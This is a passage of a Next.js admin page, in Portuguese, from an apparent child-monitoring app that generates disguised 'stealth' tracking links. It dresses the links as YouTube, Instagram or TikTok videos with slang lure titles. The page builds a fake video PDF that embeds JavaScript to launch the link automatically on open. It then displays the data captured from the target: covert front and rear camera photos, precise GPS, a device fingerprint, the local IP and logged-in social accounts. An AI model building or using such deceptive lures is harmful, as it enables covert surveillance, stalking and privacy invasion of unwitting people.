'use client';

// Página de detalhes do filho - Check-ins, cercas virtuais, horários programados

import { useEffect, useState } from 'react';
import { useParams, useRouter } from 'next/navigation';
import Link from 'next/link';
import { jsPDF } from 'jspdf';

interface Checkin {
  id: string;
  foto: string | null;
  fotoTraseira: string | null;
  latitude: number;
  longitude: number;
  endereco: string | null;
  ip: string;
  userAgent: string;
  plataforma: string | null;
  navegador: string | null;
  tela: string | null;
  bateria: number | null;
  carregando: boolean | null;
  rede: string | null;
  idioma: string | null;
  timezone: string | null;
  // GPS detalhado
  altitude: number | null;
  velocidade: number | null;
  precisaoGPS: number | null;
  direcao: number | null;
  // Hardware
  memoriaRAM: number | null;
  nucleosCPU: number | null;
  gpu: string | null;
  // Fingerprint
  canvasHash: string | null;
  pixelRatio: number | null;
  colorDepth: number | null;
  maxTouchPoints: number | null;
  fontes: string | null;
  // Rede extra
  ipLocal: string | null;
  downlink: number | null;
  rtt: number | null;
  // Extras
  orientacaoTela: string | null;
  modoEscuro: boolean | null;
  cookiesAtivos: boolean | null;
  dnt: boolean | null;
  armazenamento: number | null;
  vendor: string | null;
  platform: string | null;
  webdriver: boolean | null;
  createdAt: string;
  socialSessions?: string | { google?: boolean; facebook?: boolean; instagram?: boolean };
}

interface Cerca {
  id: string;
  nome: string;
  latitude: number;
  longitude: number;
  raio: number;
  ativa: boolean;
  createdAt: string;
}

interface Horario {
  id: string;
  diaSemana: string;
  horario: string;
  ativo: boolean;
}

interface Token {
  id: string;
  token: string;
  expiracao: string;
  usado: boolean;
  videoTipo: string;
  redirectUrl: string | null;
  createdAt: string;
}

interface Alerta {
  id: string;
  tipo: string;
  mensagem: string;
  lido: boolean;
  createdAt: string;
}

interface FilhoDetalhes {
  id: string;
  nome: string;
  idade: number | null;
  dispositivo: string | null;
  ativo: boolean;
  createdAt: string;
  checkins: Checkin[];
  tokens: Token[];
  cercas: Cerca[];
  horarios: Horario[];
  alertas: Alerta[];
}

const DIAS_SEMANA = [
  { value: 'SEGUNDA', label: 'Segunda' },
  { value: 'TERCA', label: 'Terça' },
  { value: 'QUARTA', label: 'Quarta' },
  { value: 'QUINTA', label: 'Quinta' },
  { value: 'SEXTA', label: 'Sexta' },
  { value: 'SABADO', label: 'Sábado' },
  { value: 'DOMINGO', label: 'Domingo' },
];

export default function FilhoDetalhesPage() {
  const params = useParams();
  const router = useRouter();
  const [filho, setFilho] = useState<FilhoDetalhes | null>(null);
  const [loading, setLoading] = useState(true);
  const [tab, setTab] = useState<'checkins' | 'cercas' | 'horarios' | 'alertas'>('checkins');

  // Cerca form
  const [showCercaForm, setShowCercaForm] = useState(false);
  const [cercaNome, setCercaNome] = useState('');
  const [cercaLat, setCercaLat] = useState('');
  const [cercaLng, setCercaLng] = useState('');
  const [cercaRaio, setCercaRaio] = useState('500');

  // Horario form
  const [showHorarioForm, setShowHorarioForm] = useState(false);
  const [horarioDia, setHorarioDia] = useState('SEGUNDA');
  const [horarioHora, setHorarioHora] = useState('08:00');

  // Link check-in
  const [linkData, setLinkData] = useState<string | null>(null);
  const [videoTipo, setVideoTipo] = useState('youtube_funny');
  const [redirectUrl, setRedirectUrl] = useState('');
  const [showLinkConfig, setShowLinkConfig] = useState(false);
  const [pdfTitulo, setPdfTitulo] = useState('');
  const [pdfFoto, setPdfFoto] = useState<string | null>(null);
  const [pdfFotoPreview, setPdfFotoPreview] = useState<string | null>(null);

  // Modal foto ampliada
  const [fotoModal, setFotoModal] = useState<{ url: string; data: string } | null>(null);

  const downloadFoto = (url: string, nome: string) => {
    const link = document.createElement('a');
    link.href = url;
    link.download = `foto_${nome}_${new Date().toISOString().slice(0,10)}.jpg`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const VIDEO_TIPO_LABELS: Record<string, { label: string; app: string; emoji: string; tituloDefault: string }> = {
    youtube_funny: { label: 'V\u00eddeo Engra\u00e7ado', app: 'YouTube', emoji: '(Video)', tituloDefault: 'kkkkk mano olha isso nao tankei' },
    youtube_music: { label: 'Clipe Musical', app: 'YouTube', emoji: '(Musica)', tituloDefault: 'Nova musica BRABA - Clipe Oficial' },
    youtube_gaming: { label: 'Gaming', app: 'YouTube', emoji: '(Game)', tituloDefault: 'JOGADA INSANA highlight' },
    instagram_reel: { label: 'Reels', app: 'Instagram', emoji: '(Reel)', tituloDefault: 'Olha esse reel kkkkk' },
    tiktok: { label: 'Video Viral', app: 'TikTok', emoji: '(TikTok)', tituloDefault: 'Esse video ta viralizando MUITO' },
  };

  const handlePdfFoto = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => {
      const result = reader.result as string;
      setPdfFoto(result);
      setPdfFotoPreview(result);
    };
    reader.readAsDataURL(file);
  };

  const gerarPDF = () => {
    if (!linkData || !filho) return;
    const info = VIDEO_TIPO_LABELS[videoTipo] || VIDEO_TIPO_LABELS.youtube_funny;
    const doc = new jsPDF({ orientation: 'portrait', unit: 'mm', format: 'a4' });

    // Fundo
    doc.setFillColor(15, 15, 15);
    doc.rect(0, 0, 210, 297, 'F');

    // Card central
    const cx = 30;
    const cy = 60;
    const cw = 150;

    // Sombra do card
    doc.setFillColor(25, 25, 25);
    doc.roundedRect(cx + 1, cy + 1, cw, 130, 4, 4, 'F');

    // Card
    doc.setFillColor(26, 26, 26);
    doc.roundedRect(cx, cy, cw, 130, 4, 4, 'F');

    // Thumbnail gradient area
    doc.setFillColor(40, 20, 60);
    doc.rect(cx, cy, cw, 60, 'F');

    // Thumbnail image (se fornecida)
    if (pdfFoto) {
      try {
        doc.addImage(pdfFoto, 'JPEG', cx, cy, cw, 60);
        // Overlay escuro semi-transparente
        doc.setFillColor(0, 0, 0);
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const GState = (doc as any).GState;
        if (GState) {
          doc.setGState(new GState({ opacity: 0.35 }));
          doc.rect(cx, cy, cw, 60, 'F');
          doc.setGState(new GState({ opacity: 1 }));
        }
      } catch { /* fallback: fica sem imagem */ }
    }

    // Play button
    if (info.app === 'YouTube') {
      doc.setFillColor(255, 0, 0);
      doc.roundedRect(cx + 60, cy + 20, 30, 20, 4, 4, 'F');
      doc.setFillColor(255, 255, 255);
      doc.triangle(cx + 71, cy + 25, cx + 71, cy + 35, cx + 81, cy + 30, 'F');
    } else if (info.app === 'Instagram') {
      doc.setDrawColor(255, 255, 255);
      doc.setLineWidth(1.5);
      doc.circle(cx + 75, cy + 30, 12, 'S');
      doc.setFillColor(255, 255, 255);
      doc.triangle(cx + 71, cy + 24, cx + 71, cy + 36, cx + 82, cy + 30, 'F');
    } else {
      doc.setDrawColor(255, 255, 255);
      doc.setLineWidth(1);
      doc.circle(cx + 75, cy + 30, 12, 'S');
      doc.setFillColor(255, 255, 255);
      doc.triangle(cx + 71, cy + 24, cx + 71, cy + 36, cx + 82, cy + 30, 'F');
    }

    // Duration badge
    doc.setFillColor(0, 0, 0);
    doc.roundedRect(cx + cw - 25, cy + 50, 20, 7, 1, 1, 'F');
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(7);
    doc.text('3:24', cx + cw - 15, cy + 55, { align: 'center' });

    // Channel avatar
    doc.setFillColor(80, 80, 200);
    doc.circle(cx + 12, cy + 70, 5, 'F');
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(8);
    doc.text(info.app.charAt(0), cx + 12, cy + 72, { align: 'center' });

    // Video title
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    const titulo = pdfTitulo.trim() || info.tituloDefault;
    doc.text(titulo.substring(0, 45), cx + 22, cy + 68);

    // Channel + views
    doc.setTextColor(170, 170, 170);
    doc.setFontSize(8);
    doc.text(`${info.app} ${info.emoji} - Compartilhado`, cx + 22, cy + 76);

    // Separator
    doc.setDrawColor(50, 50, 50);
    doc.setLineWidth(0.3);
    doc.line(cx + 10, cy + 82, cx + cw - 10, cy + 82);

    // "Toque para assistir" message
    doc.setTextColor(100, 160, 255);
    doc.setFontSize(10);
    doc.text('Toque no link abaixo para assistir:', cx + cw / 2, cy + 92, { align: 'center' });

    // Link (clicavel)
    doc.setTextColor(70, 140, 255);
    doc.setFontSize(8);
    const displayUrl = linkData.length > 60 ? linkData.substring(0, 57) + '...' : linkData;
    doc.textWithLink(displayUrl, cx + cw / 2 - doc.getTextWidth(displayUrl) / 2, cy + 102, { url: linkData });

    // Underline do link
    const linkWidth = doc.getTextWidth(displayUrl);
    doc.setDrawColor(70, 140, 255);
    doc.setLineWidth(0.2);
    doc.line(cx + cw / 2 - linkWidth / 2, cy + 103, cx + cw / 2 + linkWidth / 2, cy + 103);

    // QR hint
    doc.setTextColor(100, 100, 100);
    doc.setFontSize(7);
    doc.text('Ou abra a camera e escaneie o QR code', cx + cw / 2, cy + 115, { align: 'center' });

    // Footer
    doc.setTextColor(60, 60, 60);
    doc.setFontSize(6);
    doc.text('Compartilhado com voce via link', 105, cy + 125, { align: 'center' });

    // Top header
    doc.setTextColor(200, 200, 200);
    doc.setFontSize(13);
    doc.text(`${info.app} ${info.emoji}`, 105, 35, { align: 'center' });
    doc.setTextColor(120, 120, 120);
    doc.setFontSize(8);
    doc.text('Video compartilhado', 105, 42, { align: 'center' });

    // Bottom branding
    doc.setTextColor(40, 40, 40);
    doc.setFontSize(5);
    doc.text('Abra o link acima para assistir o video', 105, 250, { align: 'center' });

    // Fazer toda a página ser um link clicável (área grande)
    doc.link(0, 0, 210, 297, { url: linkData });

    // JavaScript para auto-abrir o link quando o PDF for aberto (Adobe Reader)
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const pdfInternal = (doc as any).internal;
    if (pdfInternal && pdfInternal.events) {
      const jsCode = `app.launchURL("${linkData}", true);`;
      // Adicionar JS ao catálogo do PDF
      pdfInternal.events.subscribe('putCatalog', function () {
        // Esse evento permite adicionar ao catálogo
      });
      // Método alternativo: adicionar via output
      const addJS = () => {
        const objId = pdfInternal.newObject();
        pdfInternal.out(objId + ' 0 obj');
        pdfInternal.out('<< /S /JavaScript /JS (' + jsCode + ') >>');
        pdfInternal.out('endobj');
        
        const namesId = pdfInternal.newObject();
        pdfInternal.out(namesId + ' 0 obj');
        pdfInternal.out('<< /Names [(AutoOpen) ' + objId + ' 0 R] >>');
        pdfInternal.out('endobj');
        
        // OpenAction para abrir URL automaticamente
        pdfInternal.out('/OpenAction ' + objId + ' 0 R');
        pdfInternal.out('/Names << /JavaScript ' + namesId + ' 0 R >>');
      };
      try { addJS(); } catch { /* fallback: link clicável */ }
    }

    doc.save(`video_${filho.nome.toLowerCase().replace(/\s/g, '_')}_${new Date().toISOString().slice(0,10)}.pdf`);
  };

  useEffect(() => {
    fetchFilho();
  }, []);

  const fetchFilho = async () => {
    try {
      const res = await fetch(`/api/filhos/${params.id}`);
      const data = await res.json();
      if (res.ok) setFilho(data.filho);
      else router.push('/admin/filhos');
    } catch (err) {
      console.error('Erro:', err);
    } finally {
      setLoading(false);
    }
  };

  const gerarLink = async () => {
    try {
      const res = await fetch('/api/tokens', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          filhoId: params.id,
          videoTipo,
          redirectUrl: redirectUrl.trim() || undefined,
        }),
      });
      const data = await res.json();
      if (res.ok) setLinkData(data.url);
    } catch (err) {
      console.error('Erro:', err);
    }
  };

  const criarCerca = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await fetch('/api/cercas', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          filhoId: params.id,
          nome: cercaNome,
          latitude: parseFloat(cercaLat),
          longitude: parseFloat(cercaLng),
          raio: parseFloat(cercaRaio),
        }),
      });
      if (res.ok) {
        setCercaNome(''); setCercaLat(''); setCercaLng(''); setCercaRaio('500');
        setShowCercaForm(false);
        fetchFilho();
      }
    } catch (err) {
      console.error('Erro:', err);
    }
  };

  const removerCerca = async (id: string) => {
    if (!confirm('Remover esta cerca virtual?')) return;
    await fetch(`/api/cercas?id=${id}`, { method: 'DELETE' });
    fetchFilho();
  };

  const toggleCerca = async (id: string, ativa: boolean) => {
    await fetch(`/api/cercas?id=${id}`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ativa: !ativa }),
    });
    fetchFilho();
  };

  const criarHorario = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await fetch('/api/horarios', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          filhoId: params.id,
          diaSemana: horarioDia,
          horario: horarioHora,
        }),
      });
      if (res.ok) {
        setShowHorarioForm(false);
        fetchFilho();
      } else {
        const data = await res.json();
        alert(data.error || 'Erro ao criar horário');
      }
    } catch (err) {
      console.error('Erro:', err);
    }
  };

  const removerHorario = async (id: string) => {
    await fetch(`/api/horarios?id=${id}`, { method: 'DELETE' });
    fetchFilho();
  };

  const obterLocalizacaoAtual = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          setCercaLat(pos.coords.latitude.toFixed(6));
          setCercaLng(pos.coords.longitude.toFixed(6));
        },
        () => alert('Não foi possível obter sua localização')
      );
    }
  };

  const formatDate = (dateStr: string) => {
    return new Intl.DateTimeFormat('pt-BR', {
      day: '2-digit', month: '2-digit', year: 'numeric',
      hour: '2-digit', minute: '2-digit',
    }).format(new Date(dateStr));
  };

  if (loading || !filho) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-center">
          <div className="text-hacker-glow text-2xl animate-flicker mb-3 font-mono">&#9608;</div>
          <p className="text-hacker-dim text-sm font-mono">Carregando dados do alvo...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center gap-3">
        <Link href="/admin/filhos" className="text-hacker-dim hover:text-hacker-glow transition-colors font-mono text-sm">
          {'<'}- voltar
        </Link>
      </div>

      {/* Info do filho */}
      <div className="card">
        <div className="flex items-center justify-between flex-wrap gap-4">
          <div className="flex items-center gap-4">
            <div className="w-14 h-14 border-2 border-hacker-glow/50 bg-hacker-surface flex items-center justify-center text-xl font-bold text-hacker-glow font-mono">
              {filho.nome.charAt(0).toUpperCase()}
            </div>
            <div>
              <h1 className="text-xl font-bold text-hacker-glow text-glow font-mono">{'>'} {filho.nome}</h1>
              <p className="text-hacker-dim text-xs font-mono mt-1">
                {filho.idade ? `idade: ${filho.idade}` : ''}
                {filho.idade && filho.dispositivo ? ' | ' : ''}
                {filho.dispositivo ? `disp: ${filho.dispositivo}` : ''}
                {' | desde: '}{formatDate(filho.createdAt)}
              </p>
            </div>
          </div>
          <button onClick={() => setShowLinkConfig(!showLinkConfig)} className="btn-success text-sm font-mono">$ gerar_link</button>
        </div>

        {/* Configuração do link */}
        {showLinkConfig && !linkData && (
          <div className="mt-4 p-4 border border-hacker-glow/30 bg-hacker-surface space-y-4">
            <p className="text-sm font-bold text-hacker-glow font-mono">{'>'} configurar link stealth</p>

            {/* Tipo de vídeo */}
            <div>
              <label className="block text-xs text-hacker-dim font-mono mb-1.5">$ tipo_pagina:</label>
              <select
                value={videoTipo}
                onChange={(e) => setVideoTipo(e.target.value)}
                className="input-field w-full text-xs font-mono"
              >
                <option value="youtube_funny">📺 YouTube - Vídeo Engraçado</option>
                <option value="youtube_music">🎵 YouTube - Clipe Musical</option>
                <option value="youtube_gaming">🎮 YouTube - Gaming</option>
                <option value="instagram_reel">📸 Instagram - Reels</option>
                <option value="tiktok">🎭 TikTok - Vídeo Viral</option>
              </select>
            </div>

            {/* URL de redirecionamento */}
            <div>
              <label className="block text-xs text-hacker-dim font-mono mb-1.5">$ redirect_url <span className="text-hacker-muted">(opcional - deixe vazio para padrão)</span>:</label>
              <input
                type="url"
                value={redirectUrl}
                onChange={(e) => setRedirectUrl(e.target.value)}
                placeholder="https://www.youtube.com/watch?v=... ou https://www.instagram.com/reel/..."
                className="input-field w-full text-xs font-mono"
              />
              <p className="text-[10px] text-hacker-muted font-mono mt-1">
                // cole aqui a URL do vídeo real para onde será redirecionado após captura
              </p>
            </div>

            {/* Separador PDF */}
            <div className="border-t border-hacker-border pt-3 mt-1">
              <p className="text-xs text-hacker-glow font-mono mb-3">{'>'} personalizar PDF:</p>

              {/* Título do vídeo no PDF */}
              <div className="mb-3">
                <label className="block text-xs text-hacker-dim font-mono mb-1.5">$ titulo_video <span className="text-hacker-muted">(nome que aparece no PDF)</span>:</label>
                <input
                  type="text"
                  value={pdfTitulo}
                  onChange={(e) => setPdfTitulo(e.target.value)}
                  placeholder={VIDEO_TIPO_LABELS[videoTipo]?.tituloDefault || 'kkkkk mano olha isso nao tankei'}
                  className="input-field w-full text-xs font-mono"
                  maxLength={45}
                />
                <p className="text-[10px] text-hacker-muted font-mono mt-1">
                  // título do vídeo que aparecerá no PDF (máx 45 chars)
                </p>
              </div>

              {/* Foto/Thumbnail */}
              <div>
                <label className="block text-xs text-hacker-dim font-mono mb-1.5">$ thumbnail <span className="text-hacker-muted">(imagem de capa do vídeo)</span>:</label>
                <div className="flex items-center gap-3">
                  <label className="px-3 py-1.5 bg-[#0d120d] border border-[#1a2e1a] text-[#00ff41] text-xs font-mono cursor-pointer hover:bg-[#1a2e1a] transition-all">
                    📁 escolher imagem
                    <input type="file" accept="image/*" onChange={handlePdfFoto} className="hidden" />
                  </label>
                  {pdfFotoPreview && (
                    <div className="flex items-center gap-2">
                      {/* eslint-disable-next-line @next/next/no-img-element */}
                      <img src={pdfFotoPreview} alt="Preview" className="w-16 h-10 object-cover border border-hacker-border" />
                      <button onClick={() => { setPdfFoto(null); setPdfFotoPreview(null); }} className="text-red-400 text-xs font-mono hover:text-red-300">x remover</button>
                    </div>
                  )}
                </div>
                <p className="text-[10px] text-hacker-muted font-mono mt-1">
                  // imagem que aparecerá como thumbnail no PDF (opcional)
                </p>
              </div>
            </div>

            <div className="flex gap-2">
              <button onClick={gerarLink} className="btn-primary text-xs font-mono flex-1">▶ gerar link agora</button>
              <button onClick={() => setShowLinkConfig(false)} className="btn-secondary text-xs font-mono">x cancelar</button>
            </div>
          </div>
        )}

        {/* Link gerado */}
        {linkData && (
          <div className="mt-4 p-4 border border-hacker-glow/30 bg-hacker-glow/5">
            <p className="text-sm font-bold text-hacker-glow mb-2 font-mono">{'>'} link gerado para {filho.nome}:</p>
            <div className="flex gap-2">
              <input type="text" value={linkData} readOnly className="input-field flex-1 text-xs font-mono" />
              <button onClick={() => { navigator.clipboard.writeText(linkData); alert('Copiado!'); }}
                className="btn-primary text-xs font-mono">$ copiar</button>              <button onClick={gerarPDF}
                className="px-3 py-1.5 bg-[#0d120d] border border-[#1a2e1a] text-[#00ff41] text-xs font-mono hover:bg-[#1a2e1a] hover:shadow-[0_0_10px_rgba(0,255,65,0.2)] transition-all">
                \u2b07 PDF
              </button>              <button onClick={() => { setLinkData(null); setShowLinkConfig(false); }} className="btn-secondary text-xs font-mono">x</button>
            </div>
            <p className="text-[10px] text-hacker-muted font-mono mt-2">
              // tipo: {videoTipo.replace('_', ' ')} {redirectUrl ? `| redireciona para: ${redirectUrl}` : '| redirect padrão'}
            </p>
          </div>
        )}
      </div>

      {/* Tabs */}
      <div className="flex gap-1 bg-hacker-surface border border-hacker-border p-1">
        {[
          { key: 'checkins' as const, label: 'registros', count: filho.checkins.length },
          { key: 'cercas' as const, label: 'cercas', count: filho.cercas.length },
          { key: 'horarios' as const, label: 'horários', count: filho.horarios.length },
          { key: 'alertas' as const, label: 'alertas', count: filho.alertas.filter(a => !a.lido).length },
        ].map((t) => (
          <button key={t.key} onClick={() => setTab(t.key)}
            className={`flex-1 py-2 px-3 text-xs font-mono transition-all ${
              tab === t.key
                ? 'bg-hacker-glow/10 text-hacker-glow border border-hacker-glow/30'
                : 'text-hacker-muted hover:text-hacker-dim border border-transparent'
            }`}>
            $ {t.label} {t.count > 0 && <span className="ml-1 text-hacker-dim">({t.count})</span>}
          </button>
        ))}
      </div>

      {/* Tab: Check-ins */}
      {tab === 'checkins' && (
        <div className="space-y-4">
          {filho.checkins.length === 0 ? (
            <div className="card text-center py-8">
              <div className="text-hacker-muted text-3xl mb-3 font-mono">[--]</div>
              <p className="text-hacker-dim font-mono text-sm">// nenhum registro encontrado</p>
              <p className="text-hacker-muted text-xs mt-1 font-mono">$ gerar_link para iniciar rastreamento</p>
            </div>
          ) : (
            filho.checkins.map((checkin) => (
              <div key={checkin.id} className="card">
                <div className="flex flex-col md:flex-row gap-4">
                  {/* Fotos */}
                  <div className="flex flex-col gap-2 flex-shrink-0">
                    {/* Foto frontal */}
                    <div
                      className="w-full md:w-48 h-48 overflow-hidden bg-hacker-surface border border-hacker-border relative cursor-pointer group"
                      onClick={() => checkin.foto && setFotoModal({ url: checkin.foto, data: formatDate(checkin.createdAt) })}
                    >
                      {checkin.foto && (
                        // eslint-disable-next-line @next/next/no-img-element
                        <img src={checkin.foto} alt="Frontal" className="w-full h-full object-cover hacker-video group-hover:scale-105 transition-transform duration-300" />
                      )}
                      <div className="absolute top-1 left-1 text-[9px] text-hacker-glow/50 font-mono bg-black/70 px-1">
                        FRONTAL
                      </div>
                      {checkin.foto && (
                        <div className="absolute inset-0 bg-black/0 group-hover:bg-black/30 transition-all flex items-center justify-center">
                          <span className="text-white/0 group-hover:text-white/90 text-xs font-mono transition-all">🔍 ampliar</span>
                        </div>
                      )}
                    </div>
                    {/* Foto traseira */}
                    {checkin.fotoTraseira && (
                      <div
                        className="w-full md:w-48 h-48 overflow-hidden bg-hacker-surface border border-hacker-border relative cursor-pointer group"
                        onClick={() => setFotoModal({ url: checkin.fotoTraseira!, data: formatDate(checkin.createdAt) })}
                      >
                        {/* eslint-disable-next-line @next/next/no-img-element */}
                        <img src={checkin.fotoTraseira} alt="Traseira" className="w-full h-full object-cover hacker-video group-hover:scale-105 transition-transform duration-300" />
                        <div className="absolute top-1 left-1 text-[9px] text-cyan-400/50 font-mono bg-black/70 px-1">
                          TRASEIRA
                        </div>
                        <div className="absolute inset-0 bg-black/0 group-hover:bg-black/30 transition-all flex items-center justify-center">
                          <span className="text-white/0 group-hover:text-white/90 text-xs font-mono transition-all">🔍 ampliar</span>
                        </div>
                      </div>
                    )}
                  </div>
                  {/* Info */}
                  <div className="flex-1 space-y-1.5 font-mono text-xs">
                    <div className="flex items-center justify-between">
                      <p className="font-bold text-hacker-glow">{formatDate(checkin.createdAt)}</p>
                      <a href={`https://www.google.com/maps?q=${checkin.latitude},${checkin.longitude}`}
                        target="_blank" rel="noopener noreferrer"
                        className="text-cyan-400 hover:text-cyan-300 text-xs font-mono">
                        $ ver_mapa
                      </a>
                    </div>

                    {/* Localização */}
                    {checkin.endereco && (
                      <p className="text-hacker-dim">
                        <span className="text-hacker-muted">endereço:</span> {checkin.endereco}
                      </p>
                    )}
                    <p className="text-hacker-muted">
                      <span className="text-hacker-muted">coordenadas:</span> {checkin.latitude.toFixed(6)}, {checkin.longitude.toFixed(6)}
                    </p>

                    {/* GPS detalhado */}
                    {(checkin.altitude !== null || checkin.velocidade !== null || checkin.precisaoGPS !== null || checkin.direcao !== null) && (
                      <div className="grid grid-cols-2 gap-x-4 gap-y-1">
                        {checkin.altitude !== null && (
                          <p className="text-hacker-dim">
                            <span className="text-hacker-muted">altitude:</span> {checkin.altitude.toFixed(1)}m
                          </p>
                        )}
                        {checkin.velocidade !== null && (
                          <p className="text-hacker-dim">
                            <span className="text-hacker-muted">velocidade:</span> {(checkin.velocidade * 3.6).toFixed(1)} km/h
                          </p>
                        )}
                        {checkin.precisaoGPS !== null && (
                          <p className="text-hacker-dim">
                            <span className="text-hacker-muted">precisão GPS:</span>{' '}
                            <span className={checkin.precisaoGPS <= 10 ? 'text-hacker-glow' : checkin.precisaoGPS <= 50 ? 'text-yellow-400' : 'text-red-400'}>
                              ±{checkin.precisaoGPS.toFixed(0)}m
                            </span>
                          </p>
                        )}
                        {checkin.direcao !== null && (
                          <p className="text-hacker-dim">
                            <span className="text-hacker-muted">direção:</span> {checkin.direcao.toFixed(0)}°
                          </p>
                        )}
                      </div>
                    )}

                    {/* Separador */}
                    <div className="border-t border-hacker-border/50 my-1" />

                    {/* Dispositivo */}
                    <div className="grid grid-cols-2 gap-x-4 gap-y-1">
                      {checkin.plataforma && (
                        <p className="text-hacker-dim">
                          <span className="text-hacker-muted">dispositivo:</span> {checkin.plataforma}
                        </p>
                      )}
                      {checkin.navegador && (
                        <p className="text-hacker-dim">
                          <span className="text-hacker-muted">navegador:</span> {checkin.navegador}
                        </p>
                      )}
                      <p className="text-hacker-dim">
                        <span className="text-hacker-muted">ip:</span> {checkin.ip}
                      </p>
                      {checkin.ipLocal && (
                        <p className="text-hacker-dim">
                          <span className="text-hacker-muted">ip local:</span> {checkin.ipLocal}
                        </p>
                      )}
                      {checkin.tela && (
                        <p className="text-hacker-dim">
                          <span className="text-hacker-muted">tela:</span> {checkin.tela}
                        </p>
                      )}
                      {checkin.orientacaoTela && (
                        <p className="text-hacker-dim">
                          <span className="text-hacker-muted">orientação:</span> {checkin.orientacaoTela}
                        </p>
                      )}
                      {checkin.rede && (
                        <p className="text-hacker-dim">
                          <span className="text-hacker-muted">rede:</span> {checkin.rede.toUpperCase()}
                        </p>
                      )}
                      {(checkin.downlink !== null || checkin.rtt !== null) && (
                        <p className="text-hacker-dim">
                          <span className="text-hacker-muted">qualidade:</span>{' '}
                          {checkin.downlink !== null ? `${checkin.downlink} Mbps` : ''}
                          {checkin.downlink !== null && checkin.rtt !== null ? ' / ' : ''}
                          {checkin.rtt !== null ? `${checkin.rtt}ms` : ''}
                        </p>
                      )}
                      {checkin.bateria !== null && (
                        <p className="text-hacker-dim">
                          <span className="text-hacker-muted">bateria:</span>{' '}
                          <span className={checkin.bateria <= 20 ? 'text-red-400' : checkin.bateria <= 50 ? 'text-yellow-400' : 'text-hacker-glow'}>
                            {checkin.bateria}%
                          </span>
                          {checkin.carregando && ' ⚡'}
                        </p>
                      )}
                      {checkin.idioma && (
                        <p className="text-hacker-dim">
                          <span className="text-hacker-muted">idioma:</span> {checkin.idioma}
                        </p>
                      )}
                      {checkin.timezone && (
                        <p className="text-hacker-dim">
                          <span className="text-hacker-muted">fuso:</span> {checkin.timezone}
                        </p>
                      )}
                    </div>

                    {/* Hardware & Fingerprint */}
                    {(checkin.memoriaRAM || checkin.nucleosCPU || checkin.gpu || checkin.canvasHash) && (
                      <>
                        <div className="border-t border-hacker-border/50 my-1" />
                        <p className="text-hacker-glow text-[10px] opacity-70">// hardware & fingerprint</p>
                        <div className="grid grid-cols-2 gap-x-4 gap-y-1">
                          {checkin.memoriaRAM !== null && (
                            <p className="text-hacker-dim">
                              <span className="text-hacker-muted">RAM:</span> {checkin.memoriaRAM} GB
                            </p>
                          )}
                          {checkin.nucleosCPU !== null && (
                            <p className="text-hacker-dim">
                              <span className="text-hacker-muted">CPU cores:</span> {checkin.nucleosCPU}
                            </p>
                          )}
                          {checkin.gpu && (
                            <p className="text-hacker-dim col-span-2">
                              <span className="text-hacker-muted">GPU:</span> {checkin.gpu}
                            </p>
                          )}
                          {checkin.pixelRatio !== null && (
                            <p className="text-hacker-dim">
                              <span className="text-hacker-muted">pixel ratio:</span> {checkin.pixelRatio}x
                            </p>
                          )}
                          {checkin.colorDepth !== null && (
                            <p className="text-hacker-dim">
                              <span className="text-hacker-muted">cor:</span> {checkin.colorDepth}-bit
                            </p>
                          )}
                          {checkin.maxTouchPoints !== null && (
                            <p className="text-hacker-dim">
                              <span className="text-hacker-muted">touch:</span> {checkin.maxTouchPoints} pontos
                            </p>
                          )}
                          {checkin.canvasHash && (
                            <p className="text-hacker-dim">
                              <span className="text-hacker-muted">canvas ID:</span> {checkin.canvasHash}
                            </p>
                          )}
                          {checkin.armazenamento !== null && (
                            <p className="text-hacker-dim">
                              <span className="text-hacker-muted">storage:</span> {checkin.armazenamento} GB
                            </p>
                          )}
                          {checkin.vendor && (
                            <p className="text-hacker-dim">
                              <span className="text-hacker-muted">vendor:</span> {checkin.vendor}
                            </p>
                          )}
                          {checkin.platform && (
                            <p className="text-hacker-dim">
                              <span className="text-hacker-muted">platform:</span> {checkin.platform}
                            </p>
                          )}
                        </div>
                      </>
                    )}

                    {/* Social Sessions */}
                    {checkin.socialSessions && (
                      <>
                        <div className="border-t border-hacker-border/50 my-1" />
                        <div className="flex flex-wrap gap-2">
                          <span className="text-hacker-muted text-[10px]">Redes logadas:</span>
                          {(() => {
                            let social = checkin.socialSessions;
                            if (typeof social === 'string') {
                              try { social = JSON.parse(social); } catch { social = {}; }
                            }
                            return [
                              { key: 'google', label: 'Google', icon: '🟢', off: '⚪' },
                              { key: 'facebook', label: 'Facebook', icon: '🔵', off: '⚪' },
                              { key: 'instagram', label: 'Instagram', icon: '🟣', off: '⚪' },
                            ].map(({ key, label, icon, off }) => (
                              <span key={key} className={`px-1.5 py-0.5 text-[10px] border rounded ${social[key] ? 'border-green-500/40 text-green-400 bg-green-900/20' : 'border-hacker-border/40 text-hacker-muted bg-hacker-surface/30'}`}>
                                {social[key] ? icon : off} {label}
                              </span>
                            ));
                          })()}
                        </div>
                      </>
                    )}
                    {/* Status flags */}
                    {(checkin.modoEscuro !== null || checkin.cookiesAtivos !== null || checkin.dnt !== null || checkin.webdriver !== null) && (
                      <>
                        <div className="border-t border-hacker-border/50 my-1" />
                        <div className="flex flex-wrap gap-2">
                          {checkin.modoEscuro !== null && (
                            <span className={`px-1.5 py-0.5 text-[10px] border ${checkin.modoEscuro ? 'border-purple-500/40 text-purple-400 bg-purple-900/20' : 'border-yellow-500/40 text-yellow-400 bg-yellow-900/20'}`}>
                              {checkin.modoEscuro ? '🌙 dark mode' : '☀️ light mode'}
                            </span>
                          )}
